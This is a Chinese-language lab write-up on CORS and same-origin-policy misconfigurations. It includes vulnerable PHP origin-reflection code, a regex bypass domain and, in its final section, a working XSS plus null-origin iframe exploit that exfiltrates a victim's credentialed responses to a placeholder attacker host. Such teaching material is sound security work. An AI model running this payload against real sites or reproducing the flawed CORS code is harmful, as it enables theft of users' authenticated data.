# CORS & SOP

跨源资源共享，也称为 CORS，是一种允许 Web 应用程序安全地从不同域请求资源的机制。这对于网络安全至关重要，因为它可以防止一个页面上的恶意脚本通过浏览器访问另一个网页上的敏感数据。

同源策略，也称为SOP，是一种限制网页与不同来源的资源交互的安全措施。源由方案（协议）、主机名（域）和 URL 端口定义。

简单来讲就是通过CORS控制SOP进行跨域资源访问

跨源资源共享 (CORS) 是一种由 HTTP 标头定义的机制，允许服务器指定如何从不同源请求资源。虽然同源策略 (SOP) 默认情况下限制网页只能向同一域发出请求，但 CORS 使服务器能够声明此策略的例外情况，从而允许网页在受控条件下从其他域请求资源。

CORS主要通过服务器返回的http一系列响应标头来告诉浏览器该如何做，这里我们主要关注Access-Control-Allow-Origin标头

## 任意origin

```php
if (isset($_SERVER['HTTP_ORIGIN'])){
    header("Access-Control-Allow-Origin: ".$_SERVER['HTTP_ORIGIN']."");
    header('Access-Control-Allow-Credentials: true');
}
```

这段服务端php代码存在CORS缺陷，我们可以通过http请求头Origin来控制ACAO

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/60c1ad1a73824643982784eabd31b789.png)

## 不安全的正则表达式

```php
if (isset($_SERVER['HTTP_ORIGIN']) && preg_match('#corssop.thm#', $_SERVER['HTTP_ORIGIN'])) {
    header("Access-Control-Allow-Origin: ".$_SERVER['HTTP_ORIGIN']."");
    header('Access-Control-Allow-Credentials: true');
}
```

绕过方式也相当轻松corssop.thm.evilcors.thm

## Null origin

null可能会出现在

本地文件和开发：当开发人员使用 file:/// URL 在本地测试 Web 应用程序时（例如，直接在浏览器中打开 HTML 文件而不需要服务器），浏览器通常将 origin 设置为“null”。在这种情况下，开发人员可能会暂时允许 CORS 策略中的“空”源以方便测试。

sandboxed  iframe：如果 iframe 的内容来自不同的域，则使用沙盒 iframe（带有 sandbox 属性）的 Web 应用程序可能会遇到“null”来源。 “空”源是高度受限环境中的一种安全措施。

### XSS + CORS

通过xss插入iframe然后加载恶意js代码，服务器返回null值的ACAO响应头，从而允许当前域访问其他域资源

```js
<div style="margin: 10px 20px 20px; word-wrap: break-word; text-align: center;">
    <iframe id="exploitFrame" style="display:none;"></iframe>
    <textarea id="load" style="width: 1183px; height: 305px;"></textarea>
  </div>

  <script>
    // JavaScript code for the exploit, adapted for inclusion in a data URL
    var exploitCode = `
      <script>
        function exploit() {
          var xhttp = new XMLHttpRequest();
          xhttp.open("GET", "http://corssop.thm/null.php", true);
          xhttp.withCredentials = true;
          xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
              // Assuming you want to exfiltrate data to a controlled server
              var exfiltrate = function(data) {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "http://EXFILTRATOR_IP/receiver.php", true);
                xhr.withCredentials = true;
                var body = data;
                var aBody = new Uint8Array(body.length);
                for (var i = 0; i < aBody.length; i++)
                  aBody[i] = body.charCodeAt(i);
                xhr.send(new Blob([aBody]));
              };
              exfiltrate(this.responseText);
            }
          };
          xhttp.send();
        }
        exploit();
      <\/script>
    `;

    // Encode the exploit code for use in a data URL
    var encodedExploit = btoa(exploitCode);

    // Set the iframe's src to the data URL containing the exploit
    document.getElementById('exploitFrame').src = 'data:text/html;base64,' + encodedExploit;
  </script>
```

这段插入易受攻击的站点上，受害者访问后，将向目标站点发起http请求，服务器将接受null origin并返回null的ACAO标头，此时SOP将允许在当前域对其他任意域进行资源访问，第二个xhr将数据发送到攻击者服务器

由于请求源自 iframe，因此 origin 为 null
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/0beb979320354fda979d7007bf04c5f0.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/3ce3702bddb8415796c97cb46af785a9.png)
